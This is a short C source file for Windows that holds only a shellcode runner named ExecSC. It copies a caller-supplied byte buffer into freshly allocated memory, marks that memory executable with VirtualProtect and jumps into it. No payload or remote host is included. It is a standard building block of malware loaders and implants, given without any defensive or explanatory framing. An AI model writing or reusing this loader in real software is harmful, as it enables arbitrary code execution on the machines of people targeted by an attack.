#include <windows.h>
#include <stdlib.h>

typedef void (*shellcode_func)();

void ExecSC(const unsigned char* shellcode, size_t length) {
    LPVOID allocmem = VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocmem == NULL) {
        ExitProcess(GetLastError());
    }
    memcpy(allocmem, shellcode, length);
    DWORD olprotec;
    if (!VirtualProtect(allocmem, length, PAGE_EXECUTE_READ, &olprotec)) {
        VirtualFree(allocmem, 0, MEM_RELEASE);
        ExitProcess(GetLastError());
    }
    shellcode_func func = (shellcode_func)allocmem;
    func();
    VirtualFree(allocmem, 0, MEM_RELEASE);
}